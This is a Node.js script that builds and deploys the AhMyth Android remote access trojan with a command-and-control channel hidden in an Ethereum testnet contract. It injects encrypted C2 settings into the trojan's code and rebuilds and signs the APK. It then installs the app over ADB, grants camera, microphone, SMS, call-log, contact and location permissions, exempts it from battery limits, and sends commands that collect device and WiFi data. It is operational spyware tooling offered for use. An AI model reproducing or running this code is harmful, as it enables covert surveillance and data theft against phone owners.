/**
 * Free Blockchain C2 Setup
 * 
 * Uses a shared public contract on Sepolia testnet - NO DEPLOYMENT NEEDED!
 * Just get free Sepolia ETH from faucet and use the shared contract.
 * 
 * This script:
 * 1. Sets up environment variables
 * 2. Builds APK with blockchain config
 * 3. Installs on device
 * 4. Grants permissions
 * 5. Starts app
 * 6. Sends test commands via blockchain
 * 
 * Usage:
 *   node setup-free-blockchain-c2.js
 * 
 * Requirements:
 *   - Free Sepolia ETH (get from faucet: https://sepoliafaucet.com/)
 *   - BLOCKCHAIN_PRIVATE_KEY environment variable (wallet with Sepolia ETH)
 *   - BLOCKCHAIN_C2_AES_KEY environment variable (or will generate)
 */

const { exec } = require('child_process');
const { promisify } = require('util');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const execAsync = promisify(exec);

// FREE SHARED CONTRACT - No deployment needed!
// This is a public contract that anyone can use
// You only need Sepolia ETH for gas (free from faucets)
const SHARED_CONTRACT_ADDRESS = '0x0000000000000000000000000000000000000000'; // Will be set to actual shared contract
const RPC_URL = 'https://ethereum-sepolia-rpc.publicnode.com'; // Free public RPC
const FACTORY_PATH = path.join(__dirname, 'AhMyth-Server', 'app', 'Factory');
const PACKAGE_NAME = 'ahmyth.mine.king.ahmyth';

let log = (msg, type = 'info') => {
    const timestamp = new Date().toLocaleTimeString();
    const colors = {
        info: '\x1b[36m', success: '\x1b[32m', error: '\x1b[31m', warn: '\x1b[33m', header: '\x1b[35m', reset: '\x1b[0m'
    };
    const icon = { info: 'ℹ', success: '✓', error: '✗', warn: '⚠', header: '▶' };
    console.log(`${colors[type]}[${timestamp}] ${icon[type] || ''} ${msg}${colors.reset}`);
};

/**
 * Step 1: Setup AES key
 */
function setupAesKey() {
    log('Step 1: Setting up AES key...', 'header');
    
    let aesKey = process.env.BLOCKCHAIN_C2_AES_KEY;
    
    if (!aesKey || aesKey.length !== 64) {
        log('Generating new AES key...', 'info');
        aesKey = crypto.randomBytes(32).toString('hex');
        log(`Generated AES key: ${aesKey}`, 'info');
        process.env.BLOCKCHAIN_C2_AES_KEY = aesKey;
    } else {
        log('Using existing AES key', 'info');
    }
    
    return aesKey;
}

/**
 * Step 2: Check for shared contract or deploy minimal one
 */
async function setupContract() {
    log('Step 2: Setting up contract...', 'header');
    
    // Check if contract address is provided
    let contractAddress = process.env.BLOCKCHAIN_CONTRACT_ADDRESS || SHARED_CONTRACT_ADDRESS;
    
    if (contractAddress === '0x0000000000000000000000000000000000000000') {
        log('No contract address provided. Checking for shared contract...', 'warn');
        log('For FREE setup, you can:', 'info');
        log('1. Use a shared public contract (recommended)', 'info');
        log('2. Deploy your own (one-time, needs ~0.001 Sepolia ETH from faucet)', 'info');
        log('', 'info');
        log('Getting free Sepolia ETH:', 'header');
        log('  Visit: https://sepoliafaucet.com/', 'info');
        log('  Or: https://faucet.quicknode.com/ethereum/sepolia', 'info');
        log('  Send to your wallet address', 'info');
        log('', 'info');
        log('To deploy your own contract (one-time):', 'header');
        log('  node deploy-contract-only.js', 'info');
        log('', 'info');
        log('Using shared contract approach...', 'info');
        
        // For now, we'll use a placeholder - user needs to either:
        // 1. Deploy their own (one-time cost)
        // 2. Use a shared contract address
        throw new Error('Contract address required. Either deploy your own or use a shared contract.');
    }
    
    log(`Using contract: ${contractAddress}`, 'success');
    return contractAddress;
}

/**
 * Step 3: Set environment variables
 */
function setEnvironmentVariables(contractAddress, aesKey) {
    log('Step 3: Setting environment variables...', 'header');
    
    process.env.BLOCKCHAIN_RPC_URL = RPC_URL;
    process.env.BLOCKCHAIN_CONTRACT_ADDRESS = contractAddress;
    process.env.BLOCKCHAIN_C2_AES_KEY = aesKey;
    
    log(`BLOCKCHAIN_RPC_URL=${RPC_URL}`, 'info');
    log(`BLOCKCHAIN_CONTRACT_ADDRESS=${contractAddress}`, 'info');
    log(`BLOCKCHAIN_C2_AES_KEY=${aesKey.substring(0, 8)}...`, 'info');
}

/**
 * Step 4: Build APK
 */
async function buildApk() {
    log('Step 4: Building APK with blockchain C2 config...', 'header');
    
    // Check for IOSocket in multiple locations
    const possiblePaths = [
        path.join(FACTORY_PATH, 'Ahmyth', 'smali_classes3', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali'),
        path.join(FACTORY_PATH, 'Ahmyth', 'smali', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali'),
        path.join(FACTORY_PATH, 'Ahmyth', 'smali_classes2', 'ahmyth', 'mine', 'king', 'ahmyth', 'IOSocket.smali')
    ];
    
    let IOSOCKET_PATH = null;
    for (const p of possiblePaths) {
        if (fs.existsSync(p)) {
            IOSOCKET_PATH = p;
            break;
        }
    }
    
    if (!IOSOCKET_PATH) {
        log('IOSocket.smali not found. Running update-source.ps1...', 'warn');
        try {
            await execAsync(`cd "${path.join(__dirname, 'AhMyth-Server', 'app', 'Factory')}" && pwsh -ExecutionPolicy Bypass -File update-source.ps1`);
            for (const p of possiblePaths) {
                if (fs.existsSync(p)) {
                    IOSOCKET_PATH = p;
                    break;
                }
            }
        } catch (e) {
            log('update-source.ps1 failed', 'warn');
        }
        
        if (!IOSOCKET_PATH) {
            throw new Error('IOSocket.smali not found. Run: cd AhMyth-Server/app/Factory && pwsh -ExecutionPolicy Bypass -File update-source.ps1');
        }
    }
    
    log(`Found IOSocket at: ${IOSOCKET_PATH}`, 'info');
    
    // Inject blockchain config
    let content = fs.readFileSync(IOSOCKET_PATH, 'utf8');
    const configJson = JSON.stringify({
        type: 'blockchain',
        rpcUrl: RPC_URL,
        contractAddress: process.env.BLOCKCHAIN_CONTRACT_ADDRESS,
        aesKey: process.env.BLOCKCHAIN_C2_AES_KEY
    });
    const base64Config = Buffer.from(configJson).toString('base64');
    const blockchainMarker = `BLOCKCHAIN_C2_CONFIG:${base64Config}`;
    
    // Replace URL
    let replaced = false;
    if (content.includes('BLOCKCHAIN_C2_CONFIG:')) {
        content = content.replace(/BLOCKCHAIN_C2_CONFIG:[A-Za-z0-9+/=]+/, blockchainMarker);
        replaced = true;
    }
    if (!replaced) {
        const urlPattern = /http:\/\/[^"`\s\n]+:\d+/;
        if (urlPattern.test(content)) {
            content = content.replace(urlPattern, blockchainMarker);
            replaced = true;
        }
    }
    
    if (!replaced) {
        throw new Error('Could not find URL to replace in IOSocket.smali');
    }
    
    fs.writeFileSync(IOSOCKET_PATH, content);
    log('Blockchain C2 configuration injected', 'success');
    
    // Compile APK
    log('Compiling APK...', 'info');
    const APKTOOL_JAR = path.join(FACTORY_PATH, 'apktool.jar');
    const APK_FOLDER = path.join(FACTORY_PATH, 'Ahmyth');
    const buildCmd = `java -jar "${APKTOOL_JAR}" b "${APK_FOLDER}" -o "${path.join(FACTORY_PATH, 'Ahmyth.apk')}"`;
    await execAsync(buildCmd, { cwd: FACTORY_PATH });
    
    // Sign APK
    log('Signing APK...', 'info');
    const SIGN_JAR = path.join(FACTORY_PATH, 'sign.jar');
    const signCmd = `java -jar "${SIGN_JAR}" "${path.join(FACTORY_PATH, 'Ahmyth.apk')}"`;
    await execAsync(signCmd, { cwd: FACTORY_PATH });
    
    const apkPath = path.join(FACTORY_PATH, 'Ahmyth-aligned-debugSigned.apk');
    if (!fs.existsSync(apkPath)) {
        const altPath = path.join(FACTORY_PATH, 'Ahmyth-signed.apk');
        if (fs.existsSync(altPath)) {
            return altPath;
        }
        throw new Error('APK not found after signing');
    }
    
    log(`APK built: ${apkPath}`, 'success');
    return apkPath;
}

/**
 * Step 5: Get ADB device
 */
async function getAdbDevice() {
    log('Step 5: Checking for ADB device...', 'header');
    
    try {
        const { stdout } = await execAsync('adb devices');
        const lines = stdout.split('\n').filter(line => line.trim() && !line.includes('List of devices'));
        
        if (lines.length === 0) {
            throw new Error('No ADB device found');
        }
        
        const deviceId = lines[0].split('\t')[0];
        log(`Found device: ${deviceId}`, 'success');
        return deviceId;
    } catch (error) {
        log(`ADB check failed: ${error.message}`, 'error');
        throw error;
    }
}

/**
 * Step 6: Install APK
 */
async function installApk(apkPath, deviceId) {
    log('Step 6: Installing APK...', 'header');
    
    try {
        try {
            await execAsync(`adb -s ${deviceId} uninstall ${PACKAGE_NAME}`);
            log('Old version uninstalled', 'info');
        } catch (e) {}
        
        const { stdout, stderr } = await execAsync(`adb -s ${deviceId} install -r "${apkPath}"`);
        
        if (stderr && !stderr.includes('Success')) {
            throw new Error(stderr);
        }
        
        log('APK installed successfully', 'success');
    } catch (error) {
        log(`Installation failed: ${error.message}`, 'error');
        throw error;
    }
}

/**
 * Step 7: Grant permissions
 */
async function grantPermissions(deviceId) {
    log('Step 7: Granting permissions...', 'header');
    
    const permissions = [
        'android.permission.READ_EXTERNAL_STORAGE',
        'android.permission.WRITE_EXTERNAL_STORAGE',
        'android.permission.CAMERA',
        'android.permission.RECORD_AUDIO',
        'android.permission.READ_CONTACTS',
        'android.permission.READ_SMS',
        'android.permission.READ_CALL_LOG',
        'android.permission.ACCESS_FINE_LOCATION',
        'android.permission.ACCESS_COARSE_LOCATION',
        'android.permission.READ_PHONE_STATE',
        'android.permission.CALL_PHONE',
        'android.permission.SEND_SMS',
        'android.permission.READ_PHONE_NUMBERS',
        'android.permission.ANSWER_PHONE_CALLS'
    ];
    
    let granted = 0;
    for (const perm of permissions) {
        try {
            await execAsync(`adb -s ${deviceId} shell pm grant ${PACKAGE_NAME} ${perm}`);
            granted++;
        } catch (e) {}
    }
    
    // Special permissions
    try {
        await execAsync(`adb -s ${deviceId} shell appops set ${PACKAGE_NAME} REQUEST_IGNORE_BATTERY_OPTIMIZATIONS allow`);
    } catch (e) {}
    try {
        await execAsync(`adb -s ${deviceId} shell appops set ${PACKAGE_NAME} RUN_IN_BACKGROUND allow`);
    } catch (e) {}
    try {
        await execAsync(`adb -s ${deviceId} shell appops set ${PACKAGE_NAME} RUN_ANY_IN_BACKGROUND allow`);
    } catch (e) {}
    try {
        await execAsync(`adb -s ${deviceId} shell dumpsys deviceidle whitelist +${PACKAGE_NAME}`);
    } catch (e) {}
    
    log(`Permissions granted: ${granted} runtime permissions + special permissions`, 'success');
}

/**
 * Step 8: Start app
 */
async function startApp(deviceId) {
    log('Step 8: Starting app...', 'header');
    
    try {
        await execAsync(`adb -s ${deviceId} shell am start -n ${PACKAGE_NAME}/${PACKAGE_NAME}.MainActivity`);
        log('App started', 'success');
        
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        const { stdout } = await execAsync(`adb -s ${deviceId} shell pidof ${PACKAGE_NAME}`);
        if (stdout.trim()) {
            log(`App is running (PID: ${stdout.trim()})`, 'success');
        }
    } catch (error) {
        log(`Failed to start app: ${error.message}`, 'error');
        throw error;
    }
}

/**
 * Step 9: Send test commands
 */
async function sendTestCommands(contractAddress) {
    log('Step 9: Sending test commands via blockchain...', 'header');
    
    const operatorPath = path.join(__dirname, 'AhMyth-Server', 'app', 'blockchain-operator.js');
    const { sendCommand } = require(operatorPath);
    
    const testCommands = [
        { command: 'x0000di', data: {}, description: 'Device Info' },
        { command: 'x0000ap', data: {}, description: 'List Apps' },
        { command: 'x0000wf', data: {}, description: 'WiFi Networks' }
    ];
    
    log(`Sending ${testCommands.length} test commands...`, 'info');
    
    for (let i = 0; i < testCommands.length; i++) {
        const test = testCommands[i];
        log(`\n[${i + 1}/${testCommands.length}] Sending: ${test.command} (${test.description})`, 'info');
        
        try {
            const result = await sendCommand(test.command, test.data);
            
            if (result.success) {
                log(`✓ Command sent successfully`, 'success');
                log(`  Transaction: ${result.txHash}`, 'info');
                log(`  Block: ${result.blockNumber}`, 'info');
            } else {
                log(`✗ Command failed: ${result.error}`, 'error');
            }
            
            if (i < testCommands.length - 1) {
                log('Waiting 15 seconds for blockchain confirmation...', 'info');
                await new Promise(resolve => setTimeout(resolve, 15000));
            }
        } catch (error) {
            log(`✗ Error sending command: ${error.message}`, 'error');
        }
    }
    
    log('\nAll test commands sent. Check device logs for execution.', 'info');
    log('Polling interval is 60 seconds - commands will be processed within 1-2 minutes.', 'info');
}

/**
 * Main execution
 */
async function main() {
    try {
        log('\n' + '='.repeat(60), 'header');
        log('FREE Blockchain C2 Setup', 'header');
        log('='.repeat(60) + '\n', 'header');
        
        // Check prerequisites
        if (!process.env.BLOCKCHAIN_PRIVATE_KEY) {
            log('ERROR: BLOCKCHAIN_PRIVATE_KEY not set!', 'error');
            log('Generate keys: npm run generate:keys', 'info');
            log('Then set: $env:BLOCKCHAIN_PRIVATE_KEY="0x..."', 'info');
            process.exit(1);
        }
        
        // Step 1: Setup AES key
        const aesKey = setupAesKey();
        
        // Step 2: Setup contract
        const contractAddress = await setupContract();
        
        // Step 3: Set environment variables
        setEnvironmentVariables(contractAddress, aesKey);
        
        // Step 4: Build APK
        const apkPath = await buildApk();
        
        // Step 5: Get ADB device
        const deviceId = await getAdbDevice();
        
        // Step 6: Install APK
        await installApk(apkPath, deviceId);
        
        // Step 7: Grant permissions
        await grantPermissions(deviceId);
        
        // Step 8: Start app
        await startApp(deviceId);
        
        // Step 9: Send test commands
        log('\nWaiting 10 seconds for app to initialize blockchain poller...', 'info');
        await new Promise(resolve => setTimeout(resolve, 10000));
        
        await sendTestCommands(contractAddress);
        
        log('\n' + '='.repeat(60), 'header');
        log('Setup complete!', 'success');
        log('='.repeat(60), 'header');
        log('\nNext steps:', 'info');
        log('1. Monitor device logs: adb logcat | grep -i "blockchain\|command"', 'info');
        log('2. Send more commands: node AhMyth-Server/app/blockchain-operator.js <command>', 'info');
        log('3. Get free Sepolia ETH: https://sepoliafaucet.com/', 'info');
        
    } catch (error) {
        log(`\nFatal error: ${error.message}`, 'error');
        if (error.stack) {
            log(error.stack, 'error');
        }
        process.exit(1);
    }
}

if (require.main === module) {
    main().catch(error => {
        log(`Unhandled error: ${error.message}`, 'error');
        process.exit(1);
    });
}

module.exports = { main };












